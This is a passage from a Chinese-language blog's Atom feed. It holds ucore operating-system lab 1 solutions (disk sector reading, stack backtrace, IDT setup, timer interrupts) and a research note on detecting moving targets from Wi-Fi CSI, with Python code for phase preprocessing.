    <span class="token comment" spellcheck="true">// wait for disk to be ready</span>
    <span class="token function">waitdisk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// count = 1</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F3</span><span class="token punctuation">,</span> secno <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>secno <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F5</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>secno <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F6</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>secno <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xE0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F7</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">// cmd 0x20 - read sectors</span>

    <span class="token comment" spellcheck="true">// wait for disk to be ready</span>
    <span class="token function">waitdisk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// read a sector</span>
    <span class="token function">insl</span><span class="token punctuation">(</span><span class="token number">0x1F0</span><span class="token punctuation">,</span> dst<span class="token punctuation">,</span> SECTSIZE <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>读一个扇区的流程大致如下：</p>
<ol>
<li>等待磁盘准备好</li>
<li>发出读取扇区的命令</li>
<li>等待磁盘准备好</li>
<li>把磁盘扇区数据读到指定内存</li>
</ol>
<p>通过readseg函数将OS读取到ELFHDR所指示的地址（0x10000）。<br>判断头部是否合法，如不合法直接跳出。<br>把kernel的每一个程序段都载入内存。<br>通过程序入口地址加载作为ELF可执行文件的kernel。</p>
<h3 id="u7EC3_u4E605"><a href="#u7EC3_u4E605" class="headerlink" title="练习5"></a>练习5</h3><pre><code>/* *
 * print_stackframe - print a list of the saved eip values from the nested &#39;call&#39;
 * instructions that led to the current point of execution
 *
 * The x86 stack pointer, namely esp, points to the lowest location on the stack
 * that is currently in use. Everything below that location in stack is free. Pushing
 * a value onto the stack will invole decreasing the stack pointer and then writing
 * the value to the place that stack pointer pointes to. And popping a value do the
 * opposite.
 *
 * The ebp (base pointer) register, in contrast, is associated with the stack
 * primarily by software convention. On entry to a C function, the function&#39;s
 * prologue code normally saves the previous function&#39;s base pointer by pushing
 * it onto the stack, and then copies the current esp value into ebp for the duration
 * of the function. If all the functions in a program obey this convention,
 * then at any given point during the program&#39;s execution, it is possible to trace
 * back through the stack by following the chain of saved ebp pointers and determining
 * exactly what nested sequence of function calls caused this particular point in the
 * program to be reached. This capability can be particularly useful, for example,
 * when a particular function causes an assert failure or panic because bad arguments
 * were passed to it, but you aren&#39;t sure who passed the bad arguments. A stack
 * backtrace lets you find the offending function.
 *
 * The inline function read_ebp() can tell us the value of current ebp. And the
 * non-inline function read_eip() is useful, it can read the value of current eip,
 * since while calling this function, read_eip() can read the caller&#39;s eip from
 * stack easily.
 *
 * In print_debuginfo(), the function debuginfo_eip() can get enough information about
 * calling-chain. Finally print_stackframe() will trace and print them for debugging.
 *
 * Note that, the length of ebp-chain is limited. In boot/bootasm.S, before jumping
 * to the kernel entry, the value of ebp has been set to zero, that&#39;s the boundary.
 * */
void
print_stackframe(void) {
     /* LAB1 YOUR CODE : STEP 1 */
     /* (1) call read_ebp() to get the value of ebp. the type is (uint32_t);
      * (2) call read_eip() to get the value of eip. the type is (uint32_t);
      * (3) from 0 .. STACKFRAME_DEPTH
      *    (3.1) printf value of ebp, eip
      *    (3.2) (uint32_t)calling arguments [0..4] = the contents in address (unit32_t)ebp +2 [0..4]
      *    (3.3) cprintf(&quot;\n&quot;);
      *    (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc.
      *    (3.5) popup a calling stackframe
      *           NOTICE: the calling funciton&#39;s return addr eip  = ss:[ebp+4]
      *                   the calling funciton&#39;s ebp = ss:[ebp]
      */
    uint32_t ebp = read_ebp();
    uint32_t eip = read_eip();

    int i, j;
    for(i = 0; ebp != 0 &amp;&amp; i &lt; STACKFRAME_DEPTH; i++)
    {
        cprintf(&quot;epb:0x%08x eip:0x%08x args:&quot;, ebp, eip);
        uint32_t *args = (uint32_t *)ebp + 2;
        for (j = 0; j &lt; 4; j++)
        {
            cprintf(&quot;0x%08x &quot;, args[j]);
        }
        cprintf(&quot;\n&quot;);
        print_debuginfo(eip - 1);
        eip = ((uint32_t *)ebp)[1];
        ebp = ((uint32_t *)ebp)[0];
    }

}
</code></pre><p>提示还是挺详细的，按照提示一步步写就能写出。首先读取ebp和eip的值，然后将堆栈里的信息打印出来，之后移动eip和ebp。</p>
<h3 id="u7EC3_u4E606"><a href="#u7EC3_u4E606" class="headerlink" title="练习6"></a>练习6</h3><p>1.中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</p>
<p>通过查看/kern/mm/mmh.h,将struct gatedesc中元素的位相加，共64bit也就是8个字节。另外低16bit和高16bit为段偏移量，查看这个<a href="http://wiki.osdev.org/Interrupt_Descriptor_Table" target="_blank" rel="external">资料</a>,可以知道段选择子是16bit。</p>
<table>
<thead>
<tr>
<th>Name</th>
<th style="text-align:center">Bit</th>
<th style="text-align:left">Full Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Offset</td>
<td style="text-align:center">48..63</td>
<td style="text-align:left">Offset 16..31</td>
</tr>
<tr>
<td>P</td>
<td style="text-align:center">47</td>
<td style="text-align:left">Present</td>
</tr>
<tr>
<td>DPL</td>
<td style="text-align:center">45,46</td>
<td style="text-align:left">Descriptor Privilege Level</td>
</tr>
<tr>
<td>S</td>
<td style="text-align:center">44</td>
<td style="text-align:left">Storage Segment</td>
</tr>
<tr>
<td>Type</td>
<td style="text-align:center">40..43</td>
<td style="text-align:left">Gate Type 0..3</td>
</tr>
<tr>
<td>0</td>
<td style="text-align:center">32..39</td>
<td style="text-align:left">Unused 0..7</td>
</tr>
<tr>
<td>Selector</td>
<td style="text-align:center">16..31</td>
<td style="text-align:left">Selector 0..15</td>
</tr>
<tr>
<td>Offset</td>
<td style="text-align:center">0..15</td>
<td style="text-align:left">Offset 0..15</td>
</tr>
</tbody>
</table>
<p>2.请编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init。在idt_init函数中，依次对所有中断入口进行初始化。使用mmu.h中的SETGATE宏，填充idt数组内容。每个中断的入口由tools/vectors.c生成，使用trap.c中声明的vectors数组即可。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* idt_init - initialize IDT to each of the entry points in kern/trap/vectors.S */</span>
<span class="token keyword">void</span>
<span class="token function">idt_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token comment" spellcheck="true">/* LAB1 YOUR CODE : STEP 2 */</span>
     <span class="token comment" spellcheck="true">/* (1) Where are the entry addrs of each Interrupt Service Routine (ISR)?
      *     All ISR's entry addrs are stored in __vectors. where is uintptr_t __vectors[] ?
      *     __vectors[] is in kern/trap/vector.S which is produced by tools/vector.c
      *     (try "make" command in lab1, then you will find vector.S in kern/trap DIR)
      *     You can use  "extern uintptr_t __vectors[];" to define this extern variable which will be used later.
      * (2) Now you should setup the entries of ISR in Interrupt Description Table (IDT).
      *     Can you see idt[256] in this file? Yes, it's IDT! you can use SETGATE macro to setup each item of IDT
      * (3) After setup the contents of IDT, you will let CPU know where is the IDT by using 'lidt' instruction.
      *     You don't know the meaning of this instruction? just google it! and check the libs/x86.h to know more.
      *     Notice: the argument of lidt is idt_pd. try to find it!
      */</span>
    <span class="token keyword">extern</span> uintptr_t __vectors<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>idt<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> gatedesc<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KTEXT<span class="token punctuation">,</span> __vectors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> DPL_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">// set for switch from user to kernel</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_SWITCH_TOK<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KTEXT<span class="token punctuation">,</span> __vectors<span class="token punctuation">[</span>T_SWITCH_TOK<span class="token punctuation">]</span><span class="token punctuation">,</span> DPL_USER<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// load the IDT</span>
    <span class="token function">lidt</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>idt_pd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>3.请编程完善trap.c中的中断处理函数trap，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">case</span> IRQ_OFFSET <span class="token operator">+</span> IRQ_TIMER<span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">/* LAB1 YOUR CODE : STEP 3 */</span>
        <span class="token comment" spellcheck="true">/* handle the timer interrupt */</span>
        <span class="token comment" spellcheck="true">/* (1) After a timer interrupt, you should record this event using a global variable (increase it), such as ticks in kern/driver/clock.c
         * (2) Every TICK_NUM cycle, you can print some info using a funciton, such as print_ticks().
         * (3) Too Simple? Yes, I think so!
         */</span>
        ticks <span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ticks <span class="token operator">%</span> TICK_NUM <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">print_ticks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
</code></pre>
<p>To be continued.</p>
]]></content>
    
    <summary type="html">
    
      ucore
    
    </summary>
    
    
      <category term="os" scheme="http://xinqiu.me/tags/os/"/>
    
  </entry>
  
  <entry>
    <title>基于CSI的移动目标侦测研究学习</title>
    <link href="http://xinqiu.me/2016/03/12/csi-start/"/>
    <id>http://xinqiu.me/2016/03/12/csi-start/</id>
    <published>2016-03-11T16:00:00.000Z</published>
    <updated>2016-03-12T01:41:28.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>最近被老师带着搞科研，研究CSI(channel state information)。</p>
</blockquote>
<h2 id="u73AF_u5883_u5B89_u88C5"><a href="#u73AF_u5883_u5B89_u88C5" class="headerlink" title="环境安装"></a>环境安装</h2><p>需要用到<a href="http://dhalperi.github.io/linux-80211n-csitool/" target="_blank" rel="external">CSI tool</a>，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载<a href="http://pan.baidu.com/s/1dDhFuNJ" target="_blank" rel="external">清华的版本</a>。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。</p>
<p>需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。</p>
<h2 id="u83B7_u53D6_u6570_u636E"><a href="#u83B7_u53D6_u6570_u636E" class="headerlink" title="获取数据"></a>获取数据</h2><p>cd进入csitools文件夹，进入linux-80211n-csitool-supplementary/netlink，运行</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ./log_to_file tmp.dat
</code></pre>
<p>打开另一个终端，运行</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> 192.168.1.1 -i 0.2
</code></pre>
<p>netlink文件夹中的tmp.dat就是采集的原始数据。</p>
<h2 id="u8BFB_u53D6_u6570_u636E"><a href="#u8BFB_u53D6_u6570_u636E" class="headerlink" title="读取数据"></a>读取数据</h2><p>使用Matlab读取数据，进入linux-80211n-csitool-supplementary/matlab文件夹，使用read_bf_file函数可以读取数据。</p>
<p>一个例子数据包里包含</p>
<pre><code>timestamp_low: 4            (In the sample trace, timestamp_low is invalid and always 4.)
       bfee_count: 72
              Nrx: 3
              Ntx: 1
           rssi_a: 33
           rssi_b: 37
           rssi_c: 41
            noise: -127
              agc: 38
             perm: [3 2 1]
             rate: 256
              csi: [1x3x30 double]
</code></pre><p>其中:</p>
<ul>
<li><strong><strong>timestamp_low</strong></strong> 是时间戳</li>
<li><strong><strong>bfee_count</strong></strong> 数据包数量</li>
<li><strong><strong>Nrx,Ntx</strong></strong> 分别表示接收端和发送端的天线数量</li>
<li><strong><strong>rssi_a, rssi_b, rssi_c</strong></strong> 每个天线的RSSI数据，单位dB，</li>
<li><strong><strong>agc</strong></strong> Automatic Gain Control</li>
<li><strong><strong>perm</strong></strong> NIC重排列后的顺序结果，代表RF链路的顺序</li>
<li><strong><strong>rate</strong></strong> 发送包的rate</li>
<li><strong><strong>csi</strong></strong> CSI原始数据，是个Ntx×Nrx×30复数矩阵</li>
</ul>
<p>主要提取出CSI数据和timestamp_low。</p>
<a id="more"></a>
<h2 id="u6570_u636E_u9884_u5904_u7406"><a href="#u6570_u636E_u9884_u5904_u7406" class="headerlink" title="数据预处理"></a>数据预处理</h2><p>为了避免相位的偏移的影响，需要将相位进行线性变换，参考论文，写出了以下Python代码:</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> math <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> copy

N <span class="token operator">=</span> <span class="token number">1000</span> <span class="token comment" spellcheck="true"># N为采集的数据包数量</span>

<span class="token keyword">def</span> <span class="token function">complexDecoding</span><span class="token punctuation">(</span>raw_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""    
    将原始数据转化为Python可识别的复数
    这里使用了第一个天线的数据raw_data[0]
    第二根第三根天线数据下标分别为1, 2
    原始数据为a + bi, python为a + bj
    返回处理后的数据
    """</span>
    <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 30 代表子载波数量，固定为30</span>
            <span class="token keyword">if</span> raw_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'i'</span><span class="token punctuation">:</span>
                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>complex<span class="token punctuation">(</span>raw_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'j'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>complex<span class="token punctuation">(</span>raw_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data

<span class="token keyword">def</span> <span class="token function">getAP</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    根据复数计算振幅和相位
    """</span>
    amplitudes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">]</span>
    phases <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> sqrt<span class="token punctuation">(</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i <span class="token operator">+</span> m <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">.</span>real<span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i <span class="token operator">+</span> m <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">.</span>imag<span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span><span class="token punctuation">)</span>
            amplitudes<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
            phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>np<span class="token punctuation">.</span>angle<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i <span class="token operator">+</span> m <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>amplitudes<span class="token punctuation">,</span> phases<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">preprocessingPhase</span><span class="token punctuation">(</span>phases<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    将相位进行线性变换
    index是 -28 到 28 根据 IEEE 802.11n 协议
    返回变换后的相位
    """</span>
    index <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> l <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            clear <span class="token operator">=</span> <span class="token boolean">True</span>
            base <span class="token operator">=</span> <span class="token number">0</span>
            tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">></span> pi<span class="token punctuation">:</span>
                    base <span class="token operator">+=</span> <span class="token number">1</span>
                    clear <span class="token operator">=</span> <span class="token boolean">False</span>
                <span class="token keyword">elif</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token operator">-</span>pi<span class="token punctuation">:</span>
                    base <span class="token operator">-=</span> <span class="token number">1</span>
                    clear <span class="token operator">=</span> <span class="token boolean">False</span>
                tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> pi <span class="token operator">*</span> base

            <span class="token keyword">if</span> clear <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">-</span> tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 
                                    <span class="token operator">*</span> <span class="token number">1.0</span> <span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">28</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>index<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> 
                                    <span class="token operator">-</span> <span class="token number">1.0</span> <span class="token operator">/</span> <span class="token number">30</span> <span class="token operator">*</span> sum<span class="token punctuation">(</span><span class="token punctuation">[</span>tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> phases
</code></pre>
<h2 id="u53C2_u8003_u8BBA_u6587"><a href="#u53C2_u8003_u8BBA_u6587" class="headerlink" title="参考论文"></a>参考论文</h2><ol>
<li>PADS Passive Detection of Moving Targets with Dynamic Speed using PHY Layer Information</li>
</ol>
]]></content>
    
    <summary type="html">
    
      csi
    
    </summary>
    
    
      <category term="csi" scheme="http://xinqiu.me/tags/csi/"/>
    
  </entry>
  
</feed>
